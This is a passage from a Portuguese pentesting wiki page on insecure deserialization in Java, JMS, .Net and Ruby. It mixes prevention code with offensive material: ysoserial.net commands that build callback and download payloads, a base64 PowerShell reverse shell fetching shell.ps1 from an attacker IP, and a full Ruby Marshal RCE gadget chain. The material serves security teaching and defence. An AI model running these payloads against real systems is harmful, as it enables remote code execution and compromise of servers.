* **RMI (Remote Method Invocation)**: O protocolo Java RMI, que depende inteiramente da serializa√ß√£o, √© fundamental para a comunica√ß√£o remota em aplica√ß√µes Java.
* **RMI sobre HTTP**: Este m√©todo √© comumente utilizado por aplica√ß√µes web de cliente espesso baseadas em Java, utilizando a serializa√ß√£o para todas as comunica√ß√µes de objetos.
* **JMX (Java Management Extensions)**: JMX utiliza a serializa√ß√£o para transmitir objetos pela rede.
* **Protocolos Personalizados**: Em Java, a pr√°tica padr√£o envolve a transmiss√£o de objetos Java brutos, o que ser√° demonstrado em exemplos de explora√ß√£o futuros.

### Preven√ß√£o

#### Objetos Transientes

Uma classe que implementa `Serializable` pode implementar como `transient` qualquer objeto dentro da classe que n√£o deve ser serializ√°vel. Por exemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evite a Serializa√ß√£o de uma classe que precisa implementar Serializable

Em cen√°rios onde certos **objetos devem implementar a interface `Serializable`** devido √† hierarquia de classes, h√° um risco de desserializa√ß√£o n√£o intencional. Para evitar isso, garanta que esses objetos sejam n√£o desserializ√°veis definindo um m√©todo `readObject()` `final` que lan√ßa consistentemente uma exce√ß√£o, conforme mostrado abaixo:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Melhorando a Seguran√ßa da Desserializa√ß√£o em Java**

**Personalizar `java.io.ObjectInputStream`** √© uma abordagem pr√°tica para garantir a seguran√ßa dos processos de desserializa√ß√£o. Este m√©todo √© adequado quando:

* O c√≥digo de desserializa√ß√£o est√° sob seu controle.
* As classes esperadas para desserializa√ß√£o s√£o conhecidas.

Sobrescreva o m√©todo **`resolveClass()`** para limitar a desserializa√ß√£o apenas √†s classes permitidas. Isso impede a desserializa√ß√£o de qualquer classe, exceto aquelas explicitamente permitidas, como no exemplo a seguir que restringe a desserializa√ß√£o apenas para a classe `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Usando um Agente Java para Melhoria de Seguran√ßa** oferece uma solu√ß√£o alternativa quando a modifica√ß√£o de c√≥digo n√£o √© poss√≠vel. Este m√©todo se aplica principalmente para **listar classes prejudiciais**, usando um par√¢metro JVM:
```
-javaagent:name-of-agent.jar
```
Ele fornece uma maneira de garantir a desserializa√ß√£o dinamicamente, ideal para ambientes onde mudan√ßas de c√≥digo imediatas s√£o impratic√°veis.

Confira um exemplo em [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementando Filtros de Serializa√ß√£o**: O Java 9 introduziu filtros de serializa√ß√£o por meio da interface **`ObjectInputFilter`**, fornecendo um mecanismo poderoso para especificar crit√©rios que objetos serializados devem atender antes de serem desserializados. Esses filtros podem ser aplicados globalmente ou por fluxo, oferecendo um controle granular sobre o processo de desserializa√ß√£o.

Para utilizar filtros de serializa√ß√£o, voc√™ pode definir um filtro global que se aplica a todas as opera√ß√µes de desserializa√ß√£o ou configur√°-lo dinamicamente para fluxos espec√≠ficos. Por exemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aproveitando Bibliotecas Externas para Seguran√ßa Aprimorada**: Bibliotecas como **NotSoSerial**, **jdeserialize** e **Kryo** oferecem recursos avan√ßados para controlar e monitorar a desserializa√ß√£o em Java. Essas bibliotecas podem fornecer camadas adicionais de seguran√ßa, como listas de permiss√µes ou proibi√ß√µes de classes, an√°lise de objetos serializados antes da desserializa√ß√£o e implementa√ß√£o de estrat√©gias de serializa√ß√£o personalizadas.

- **NotSoSerial** intercepta processos de desserializa√ß√£o para evitar a execu√ß√£o de c√≥digo n√£o confi√°vel.
- **jdeserialize** permite a an√°lise de objetos Java serializados sem desserializ√°-los, ajudando a identificar conte√∫do potencialmente malicioso.
- **Kryo** √© um framework de serializa√ß√£o alternativo que enfatiza velocidade e efici√™ncia, oferecendo estrat√©gias de serializa√ß√£o configur√°veis que podem aprimorar a seguran√ßa.

### Refer√™ncias

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
- Palestra sobre desserializa√ß√£o e ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Palestra sobre gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) e slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Artigo Marshalsec: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Artigo sobre desserializa√ß√µes CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## Inje√ß√£o JNDI & log4Shell

Descubra o que √© **Inje√ß√£o JNDI, como abusar dela via RMI, CORBA & LDAP e como explorar o log4shell** (e um exemplo dessa vulnerabilidade) na seguinte p√°gina:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Servi√ßo de Mensagens Java

> A API do **Servi√ßo de Mensagens Java** (**JMS**) √© uma API de middleware orientada a mensagens Java para enviar mensagens entre dois ou mais clientes. √â uma implementa√ß√£o para lidar com o problema produtor-consumidor. O JMS faz parte da Plataforma Java, Enterprise Edition (Java EE), e foi definido por uma especifica√ß√£o desenvolvida na Sun Microsystems, mas que desde ent√£o tem sido orientada pelo Java Community Process. √â um padr√£o de mensagens que permite que componentes de aplicativos baseados em Java EE criem, enviem, recebam e leiam mensagens. Permite que a comunica√ß√£o entre diferentes componentes de um aplicativo distribu√≠do seja desacoplada, confi√°vel e ass√≠ncrona. (De [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Produtos

Existem v√°rios produtos que usam esse middleware para enviar mensagens:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Explora√ß√£o

Basicamente, existem **v√°rios servi√ßos usando JMS de maneira perigosa**. Portanto, se voc√™ tiver **privil√©gios suficientes** para enviar mensagens para esses servi√ßos (geralmente precisar√° de credenciais v√°lidas), poder√° enviar **objetos maliciosos serializados que ser√£o desserializados pelo consumidor/assinante**.\
Isso significa que, nessa explora√ß√£o, todos os **clientes que forem usar essa mensagem ser√£o infectados**.

Lembre-se de que, mesmo se um servi√ßo for vulner√°vel (porque est√° desserializando de forma insegura a entrada do usu√°rio), voc√™ ainda precisa encontrar gadgets v√°lidos para explorar a vulnerabilidade.

A ferramenta [JMET](https://github.com/matthiaskaiser/jmet) foi criada para **conectar e atacar esses servi√ßos enviando v√°rios objetos maliciosos serializados usando gadgets conhecidos**. Esses exploits funcionar√£o se o servi√ßo ainda estiver vulner√°vel e se algum dos gadgets usados estiver dentro do aplicativo vulner√°vel.

### Refer√™ncias

- Palestra JMET: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

No contexto do .Net, os exploits de desserializa√ß√£o operam de maneira semelhante aos encontrados em Java, onde gadgets s√£o explorados para executar c√≥digo espec√≠fico durante a desserializa√ß√£o de um objeto.
### Impress√£o Digital

#### WhiteBox

O c√≥digo fonte deve ser inspecionado em busca de ocorr√™ncias de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

O foco deve estar em serializadores que permitem que o tipo seja determinado por uma vari√°vel sob controle do usu√°rio.

#### BlackBox

A busca deve visar a string codificada em Base64 **AAEAAAD/////** ou qualquer padr√£o semelhante que possa passar por desserializa√ß√£o no lado do servidor, concedendo controle sobre o tipo a ser desserializado. Isso poderia incluir, mas n√£o se limitar a, estruturas **JSON** ou **XML** com `TypeObject` ou `$type`.

### ysoserial.net

Neste caso, voc√™ pode usar a ferramenta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **criar os exploits de desserializa√ß√£o**. Ap√≥s baixar o reposit√≥rio git, voc√™ deve **compilar a ferramenta** usando o Visual Studio, por exemplo.

Se voc√™ quiser aprender sobre **como o ysoserial.net cria seu exploit**, voc√™ pode [**ver esta p√°gina onde √© explicado o gadget ObjectDataProvider + ExpandedWrapper + formatador Json.Net**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

As principais op√ß√µes do **ysoserial.net** s√£o: **`--gadget`**, **`--formatter`**, **`--output`** e **`--plugin`.**

* **`--gadget`** usado para indicar o gadget a ser abusado (indicar a classe/fun√ß√£o que ser√° abusada durante a desserializa√ß√£o para executar comandos).
* **`--formatter`**, usado para indicar o m√©todo para serializar o exploit (voc√™ precisa saber qual biblioteca est√° sendo usada no back-end para desserializar a carga √∫til e usar a mesma para serializ√°-la)
* **`--output`** usado para indicar se voc√™ deseja o exploit em formato **raw** ou codificado em **base64**. _Observe que o **ysoserial.net** ir√° **codificar** a carga √∫til usando **UTF-16LE** (codifica√ß√£o usada por padr√£o no Windows), ent√£o se voc√™ obtiver o raw e apenas codific√°-lo a partir de um console Linux, voc√™ pode ter alguns **problemas de compatibilidade de codifica√ß√£o** que impedir√£o o exploit de funcionar corretamente (na caixa JSON HTB, a carga √∫til funcionou tanto em UTF-16LE quanto em ASCII, mas isso n√£o significa que sempre funcionar√°)._
* **`--plugin`** o ysoserial.net suporta plugins para criar **exploits para frameworks espec√≠ficos** como ViewState

#### Mais par√¢metros do ysoserial.net

* `--minify` fornecer√° uma **carga √∫til menor** (se poss√≠vel)
* `--raf -f Json.Net -c "anything"` Isso indicar√° todos os gadgets que podem ser usados com um formatador fornecido (`Json.Net` neste caso)
* `--sf xml` voc√™ pode **indicar um gadget** (`-g`) e o ysoserial.net procurar√° por formatadores contendo "xml" (mai√∫sculas e min√∫sculas)

Exemplos do **ysoserial** para criar exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** tamb√©m possui um **par√¢metro muito interessante** que ajuda a entender melhor como cada exploit funciona: `--test`. Se voc√™ indicar este par√¢metro, **ysoserial.net** ir√° **tentar** o **exploit localmente**, para que voc√™ possa testar se sua carga √∫til funcionar√° corretamente. Este par√¢metro √© √∫til porque, ao revisar o c√≥digo, voc√™ encontrar√° trechos de c√≥digo como o seguinte (de [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Isso significa que, para testar o exploit, o c√≥digo ir√° chamar [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
O **c√≥digo anterior √© vulner√°vel ao exploit criado**. Portanto, se voc√™ encontrar algo semelhante em uma aplica√ß√£o .Net, isso provavelmente significa que essa aplica√ß√£o tamb√©m √© vulner√°vel.\
Portanto, o par√¢metro **`--test`** nos permite entender **quais trechos de c√≥digo s√£o vulner√°veis** ao exploit de deserializa√ß√£o que o **ysoserial.net** pode criar.

### ViewState

D√™ uma olhada neste POST sobre **como tentar explorar o par√¢metro \_\_ViewState do .Net** para **executar c√≥digo arbitr√°rio**. Se voc√™ **j√° conhece os segredos** usados pela m√°quina v√≠tima, [**leia este post para saber como executar c√≥digo**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Preven√ß√£o

Para mitigar os riscos associados √† deserializa√ß√£o no .Net:

* **Evite permitir que fluxos de dados definam seus tipos de objeto.** Utilize `DataContractSerializer` ou `XmlSerializer` sempre que poss√≠vel.
* **Para `JSON.Net`, defina `TypeNameHandling` como `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Evite usar `JavaScriptSerializer` com um `JavaScriptTypeResolver`.**
* **Limite os tipos que podem ser desserializados**, entendendo os riscos inerentes aos tipos do .Net, como `System.IO.FileInfo`, que pode modificar as propriedades de arquivos do servidor, potencialmente levando a ataques de nega√ß√£o de servi√ßo.
* **Tenha cautela com tipos que possuem propriedades arriscadas**, como `System.ComponentModel.DataAnnotations.ValidationException` com sua propriedade `Value`, que pode ser explorada.
* **Controle com seguran√ßa a instancia√ß√£o de tipos** para evitar que os atacantes influenciem o processo de desserializa√ß√£o, tornando at√© mesmo o `DataContractSerializer` ou `XmlSerializer` vulner√°veis.
* **Implemente controles de lista branca** usando um `SerializationBinder` personalizado para `BinaryFormatter` e `JSON.Net`.
* **Mantenha-se informado sobre gadgets de desserializa√ß√£o inseguros conhecidos** dentro do .Net e garanta que os desserializadores n√£o instanciem esses tipos.
* **Isolar o c√≥digo potencialmente arriscado** do c√≥digo com acesso √† internet para evitar expor gadgets conhecidos, como `System.Windows.Data.ObjectDataProvider` em aplica√ß√µes WPF, a fontes de dados n√£o confi√°veis.

### **Refer√™ncias**

* Artigo sobre desserializa√ß√£o JSON em Java e .Net: [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** palestra: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) e slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Em Ruby, a serializa√ß√£o √© facilitada por dois m√©todos dentro da biblioteca **marshal**. O primeiro m√©todo, conhecido como **dump**, √© usado para transformar um objeto em um fluxo de bytes. Esse processo √© chamado de serializa√ß√£o. Por outro lado, o segundo m√©todo, **load**, √© empregado para reverter um fluxo de bytes de volta para um objeto, um processo conhecido como desserializa√ß√£o.

Para garantir a seguran√ßa de objetos serializados, **Ruby utiliza HMAC (C√≥digo de Autentica√ß√£o de Mensagem Baseado em Hash)**, garantindo a integridade e autenticidade dos dados. A chave utilizada para esse fim √© armazenada em uma das v√°rias localiza√ß√µes poss√≠veis:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Cadeia de gadgets de deserializa√ß√£o gen√©rica para RCE do Ruby 2.X (mais informa√ß√µes em** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Outra cadeia de RCE para explorar o Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)
